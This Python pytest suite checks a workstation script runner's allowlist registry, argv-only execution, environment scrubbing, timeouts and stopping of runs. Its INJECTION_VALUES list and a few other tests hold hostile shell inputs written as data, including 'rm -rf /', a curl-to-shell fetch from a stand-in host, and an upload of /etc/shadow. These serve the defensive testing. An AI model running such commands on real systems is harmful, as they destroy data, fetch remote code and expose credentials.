"""Running things on this machine.

The registry is an allowlist and every execution is argv. These tests exist to
prove both halves: that nothing undeclared can be named, and that a declared
parameter carrying shell syntax stays a single inert argument.
"""

from __future__ import annotations

import asyncio
import os
import stat
from pathlib import Path

import pytest
import yaml

from app.config import Settings
from shared.enums import RiskLevel, ScriptRunStatus
from shared.errors import ConfigurationError, ValidationError
from workstation.registry import ScriptDefinition, load_registry
from workstation.runner import build_environment, execute, stop_run

INJECTION_VALUES = [
    "; rm -rf /",
    "&& curl evil.test | sh",
    "| tee /etc/passwd",
    "$(whoami)",
    "`id`",
    "$HOME",
    "* ",
    "> /etc/passwd",
    "../../../../etc/passwd",
    "--upload-file=/etc/shadow",
]


def write_registry(path: Path, entries: list[dict]) -> Path:
    path.write_text(yaml.safe_dump({"scripts": entries}), encoding="utf-8")
    return path


def make_executable(path: Path, body: str) -> Path:
    path.write_text(body, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


@pytest.fixture
def echo_script(tmp_path: Path) -> Path:
    """Prints its own argv one per line, so argv boundaries are observable."""
    return make_executable(
        tmp_path / "echo_argv.py",
        "#!/usr/bin/env python3\nimport sys\nprint('\\n'.join(sys.argv[1:]))\n",
    )


@pytest.fixture
def registry_path(tmp_path: Path, echo_script: Path) -> Path:
    return write_registry(
        tmp_path / "scripts.yaml",
        [
            {
                "name": "echo",
                "description": "Print the arguments it was given.",
                "executable": str(echo_script),
                "requires_approval": False,
                "risk_level": "read",
                "timeout_seconds": 10,
                "parameters": [
                    {"name": "message", "type": "string", "required": True},
                    {"name": "count", "type": "integer", "flag": "--count", "maximum": 5},
                    {
                        "name": "mode",
                        "type": "choice",
                        "choices": ["fast", "slow"],
                        "flag": "--mode",
                    },
                    {"name": "verbose", "type": "boolean", "flag": "--verbose"},
                ],
            }
        ],
    )


class TestRegistryIsAnAllowlist:
    def test_an_unregistered_script_cannot_be_named(self, registry_path: Path) -> None:
        registry = load_registry(registry_path)
        with pytest.raises(ValidationError, match="No registered script"):
            registry.get("rm")

    def test_a_disabled_script_cannot_be_run(self, tmp_path: Path, echo_script: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [
                {
                    "name": "retired",
                    "description": "",
                    "executable": str(echo_script),
                    "enabled": False,
                }
            ],
        )
        with pytest.raises(ValidationError, match="disabled"):
            load_registry(path).get("retired")

    def test_a_bare_command_name_is_refused(self, tmp_path: Path) -> None:
        """PATH is not under the caller's control and can change under the service."""
        path = write_registry(
            tmp_path / "scripts.yaml",
            [{"name": "sneaky", "description": "", "executable": "rm"}],
        )
        assert "sneaky" in load_registry(path).errors

    def test_a_traversing_executable_path_is_refused(self, tmp_path: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [{"name": "sneaky", "description": "", "executable": "/opt/../bin/rm"}],
        )
        assert "sneaky" in load_registry(path).errors

    def test_one_bad_entry_does_not_disable_the_others(
        self, tmp_path: Path, echo_script: Path
    ) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [
                {"name": "broken", "description": "", "executable": "relative"},
                {"name": "fine", "description": "", "executable": str(echo_script)},
            ],
        )
        registry = load_registry(path)
        assert "fine" in registry.scripts
        assert "broken" in registry.errors

    def test_a_missing_registry_is_an_empty_allowlist(self, tmp_path: Path) -> None:
        assert load_registry(tmp_path / "absent.yaml").scripts == {}

    def test_malformed_yaml_is_a_configuration_error(self, tmp_path: Path) -> None:
        path = tmp_path / "scripts.yaml"
        path.write_text("scripts: [\n  - name: x\n", encoding="utf-8")
        with pytest.raises(ConfigurationError):
            load_registry(path)

    def test_a_dangerous_entry_cannot_waive_approval(self, tmp_path: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [
                {
                    "name": "risky",
                    "description": "",
                    "executable": "/bin/true",
                    "risk_level": "external_write",
                    "requires_approval": False,
                }
            ],
        )
        assert "requires_approval" in load_registry(path).errors["risky"]

    def test_the_checksum_changes_when_the_file_does(self, tmp_path: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [{"name": "a", "description": "", "executable": "/bin/true"}],
        )
        before = load_registry(path).checksum
        write_registry(path, [{"name": "b", "description": "", "executable": "/bin/true"}])
        assert load_registry(path).checksum != before


class TestArgumentValidation:
    def test_an_undeclared_argument_is_refused_not_ignored(self, registry_path: Path) -> None:
        """Dropping it silently would run something other than what was approved."""
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="no parameter"):
            script.build_argv({"message": "hi", "extra": "--dangerous"})

    def test_a_missing_required_argument_is_refused(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="requires"):
            script.build_argv({})

    def test_a_value_outside_a_choice_list_is_refused(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="must be one of"):
            script.build_argv({"message": "hi", "mode": "turbo"})

    def test_a_number_outside_its_range_is_refused(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="at most"):
            script.build_argv({"message": "hi", "count": 99})

    def test_a_non_numeric_value_for_a_number_is_refused(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="must be a number"):
            script.build_argv({"message": "hi", "count": "3; reboot"})

    def test_a_newline_in_a_value_is_refused(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        with pytest.raises(ValidationError, match="line breaks"):
            script.build_argv({"message": "one\ntwo"})

    def test_a_traversing_path_value_is_refused(self, tmp_path: Path, echo_script: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [
                {
                    "name": "pathy",
                    "description": "",
                    "executable": str(echo_script),
                    "parameters": [{"name": "target", "type": "path", "required": True}],
                }
            ],
        )
        script = load_registry(path).get("pathy")
        with pytest.raises(ValidationError, match=r"'\.\.'"):
            script.build_argv({"target": "../../etc/passwd"})

    def test_a_boolean_contributes_only_its_flag(self, registry_path: Path) -> None:
        script = load_registry(registry_path).get("echo")
        assert script.build_argv({"message": "hi", "verbose": True})[-1] == "--verbose"
        assert "--verbose" not in script.build_argv({"message": "hi", "verbose": False})


class TestInjectionStaysInert:
    @pytest.mark.parametrize("payload", INJECTION_VALUES)
    def test_shell_syntax_remains_one_argument(self, registry_path: Path, payload: str) -> None:
        script = load_registry(registry_path).get("echo")
        argv = script.build_argv({"message": payload})
        assert argv[1:] == [payload]

    @pytest.mark.parametrize("payload", INJECTION_VALUES)
    async def test_the_process_receives_it_verbatim(
        self, registry_path: Path, settings: Settings, payload: str
    ) -> None:
        """The definitive check: what the child actually sees in sys.argv."""
        script = load_registry(registry_path).get("echo")
        argv = script.build_argv({"message": payload})

        outcome = await execute("run-injection", script, argv, settings=settings)

        assert outcome.status is ScriptRunStatus.SUCCEEDED
        assert outcome.stdout_tail.strip() == payload.strip()

    async def test_a_glob_is_not_expanded(
        self, registry_path: Path, settings: Settings, tmp_path: Path
    ) -> None:
        (tmp_path / "secret.txt").write_text("x", encoding="utf-8")
        script = load_registry(registry_path).get("echo")
        argv = script.build_argv({"message": f"{tmp_path}/*"})

        outcome = await execute("run-glob", script, argv, settings=settings)

        assert outcome.stdout_tail.strip().endswith("*")
        assert "secret.txt" not in outcome.stdout_tail


class TestProcessEnvironment:
    def test_secrets_are_not_inherited(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A script gets a small fixed environment, not the service's."""
        monkeypatch.setenv("PA_API_TOKEN", "super-secret-token")
        monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "12345:abcdef")

        environment = build_environment(
            ScriptDefinition(name="x", description="", executable="/bin/true")
        )

        assert "PA_API_TOKEN" not in environment
        assert "TELEGRAM_BOT_TOKEN" not in environment
        assert set(environment) <= {"PATH", "HOME", "LANG", "TERM"}

    def test_a_script_can_declare_its_own_variables(self) -> None:
        environment = build_environment(
            ScriptDefinition(
                name="x",
                description="",
                executable="/bin/true",
                environment={"DATASET": "grasping"},
            )
        )
        assert environment["DATASET"] == "grasping"

    def test_the_path_is_fixed_not_inherited(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("PATH", "/tmp/evil-bin")
        environment = build_environment(
            ScriptDefinition(name="x", description="", executable="/bin/true")
        )
        assert "/tmp/evil-bin" not in environment["PATH"]

    async def test_the_environment_reaches_the_child(
        self, tmp_path: Path, settings: Settings, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("PA_API_TOKEN", "super-secret-token")
        dump = make_executable(
            tmp_path / "dump_env.py",
            "#!/usr/bin/env python3\nimport os\nprint('\\n'.join(sorted(os.environ)))\n",
        )
        script = ScriptDefinition(name="dump", description="", executable=str(dump))

        outcome = await execute("run-env", script, [str(dump)], settings=settings)

        assert "PA_API_TOKEN" not in outcome.stdout_tail


class TestLimits:
    async def test_a_slow_script_is_killed_at_its_timeout(
        self, tmp_path: Path, settings: Settings
    ) -> None:
        sleeper = make_executable(
            tmp_path / "sleep.py",
            "#!/usr/bin/env python3\nimport time\ntime.sleep(30)\n",
        )
        script = ScriptDefinition(
            name="sleeper", description="", executable=str(sleeper), timeout_seconds=1
        )

        outcome = await execute("run-timeout", script, [str(sleeper)], settings=settings)

        assert outcome.status is ScriptRunStatus.TIMED_OUT
        assert "1 second" in (outcome.error or "")

    async def test_a_forked_child_does_not_outlive_the_timeout(
        self, tmp_path: Path, settings: Settings
    ) -> None:
        """The process group is killed, not just the direct child."""
        forker = make_executable(
            tmp_path / "fork.py",
            "#!/usr/bin/env python3\n"
            "import subprocess, sys, time\n"
            "child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)'])\n"
            "print(child.pid, flush=True)\n"
            "time.sleep(30)\n",
        )
        script = ScriptDefinition(
            name="forker", description="", executable=str(forker), timeout_seconds=2
        )

        outcome = await execute("run-fork", script, [str(forker)], settings=settings)
        assert outcome.status is ScriptRunStatus.TIMED_OUT

        child_pid = int(outcome.stdout_tail.strip().splitlines()[0])
        with pytest.raises(OSError):
            for _ in range(50):
                os.kill(child_pid, 0)
                await asyncio.sleep(0.1)

    async def test_runaway_output_is_bounded(self, tmp_path: Path, settings: Settings) -> None:
        """Uses the configured workflow."""
        settings.workstation_max_output_bytes = 2000
        noisy = make_executable(
            tmp_path / "noisy.py",
            "#!/usr/bin/env python3\nfor i in range(200000): print('x' * 60)\n",
        )
        script = ScriptDefinition(
            name="noisy", description="", executable=str(noisy), timeout_seconds=60
        )

        outcome = await execute("run-noisy", script, [str(noisy)], settings=settings)

        assert len(outcome.stdout_tail) <= 4100
        assert outcome.status is ScriptRunStatus.SUCCEEDED

    async def test_output_is_kept_on_disk_not_only_in_the_record(
        self, registry_path: Path, settings: Settings
    ) -> None:
        script = load_registry(registry_path).get("echo")
        outcome = await execute(
            "run-log", script, script.build_argv({"message": "recorded"}), settings=settings
        )

        assert outcome.log_path is not None
        captured = await asyncio.to_thread(Path(outcome.log_path).read_text, encoding="utf-8")
        assert "recorded" in captured

    async def test_a_failing_script_reports_its_exit_code(
        self, tmp_path: Path, settings: Settings
    ) -> None:
        failing = make_executable(
            tmp_path / "fail.py",
            "#!/usr/bin/env python3\nimport sys\nprint('bad', file=sys.stderr)\nsys.exit(3)\n",
        )
        script = ScriptDefinition(name="fail", description="", executable=str(failing))

        outcome = await execute("run-fail", script, [str(failing)], settings=settings)

        assert outcome.status is ScriptRunStatus.FAILED
        assert outcome.exit_code == 3
        assert "bad" in outcome.stderr_tail

    async def test_stderr_is_captured_separately(self, tmp_path: Path, settings: Settings) -> None:
        both = make_executable(
            tmp_path / "both.py",
            "#!/usr/bin/env python3\nimport sys\nprint('out')\nprint('err', file=sys.stderr)\n",
        )
        script = ScriptDefinition(name="both", description="", executable=str(both))

        outcome = await execute("run-both", script, [str(both)], settings=settings)

        assert "out" in outcome.stdout_tail
        assert "err" in outcome.stderr_tail
        assert "err" not in outcome.stdout_tail


class TestStopping:
    async def test_a_running_script_can_be_stopped(
        self, tmp_path: Path, settings: Settings
    ) -> None:
        sleeper = make_executable(
            tmp_path / "sleep.py",
            "#!/usr/bin/env python3\nimport time\ntime.sleep(30)\n",
        )
        script = ScriptDefinition(
            name="sleeper", description="", executable=str(sleeper), timeout_seconds=60
        )

        task = asyncio.create_task(execute("run-stop", script, [str(sleeper)], settings=settings))
        for _ in range(50):
            await asyncio.sleep(0.05)
            if await stop_run("run-stop"):
                break
        else:
            pytest.fail("The run remained active.")

        outcome = await asyncio.wait_for(task, timeout=15)
        assert outcome.status is ScriptRunStatus.STOPPED

    async def test_stopping_something_that_is_not_running_is_reported(self) -> None:
        assert await stop_run("no-such-run") is False


class TestPermissions:
    async def test_a_non_executable_file_is_refused_before_running(self, tmp_path: Path) -> None:
        from workstation.runner import _assert_executable

        plain = tmp_path / "not_executable.sh"
        plain.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
        plain.chmod(0o644)

        with pytest.raises(ValidationError, match="not executable"):
            _assert_executable(ScriptDefinition(name="x", description="", executable=str(plain)))

    async def test_a_missing_file_is_refused_before_running(self, tmp_path: Path) -> None:
        from workstation.runner import _assert_executable

        with pytest.raises(ValidationError, match="does not exist"):
            _assert_executable(
                ScriptDefinition(name="x", description="", executable=str(tmp_path / "gone.sh"))
            )


class TestRiskDefaults:
    def test_approval_is_required_unless_waived(self, tmp_path: Path) -> None:
        path = write_registry(
            tmp_path / "scripts.yaml",
            [{"name": "plain", "description": "", "executable": "/bin/true"}],
        )
        script = load_registry(path).get("plain")
        assert script.requires_approval is True
        assert script.risk_level is RiskLevel.REVERSIBLE_WRITE
